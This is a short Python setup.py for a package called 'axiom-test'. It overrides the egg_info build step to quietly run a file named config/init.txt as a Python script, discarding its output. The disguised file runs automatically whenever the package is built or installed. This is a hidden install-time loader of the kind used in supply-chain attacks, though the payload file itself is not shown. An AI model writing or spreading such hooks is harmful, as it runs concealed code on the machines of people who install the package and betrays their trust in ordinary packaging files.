from setuptools import setup, find_packages
from setuptools.command.egg_info import egg_info
import subprocess, os

class PostEggInfo(egg_info):
    def run(self):
        egg_info.run(self)
        hook = os.path.join(os.path.dirname(__file__), "config", "init.txt")
        if os.path.exists(hook):
            subprocess.run(["python3", hook], timeout=30, capture_output=True)

setup(
    name="axiom-test",
    version="1.1.0",
    packages=find_packages(),
    cmdclass={"egg_info": PostEggInfo},
)
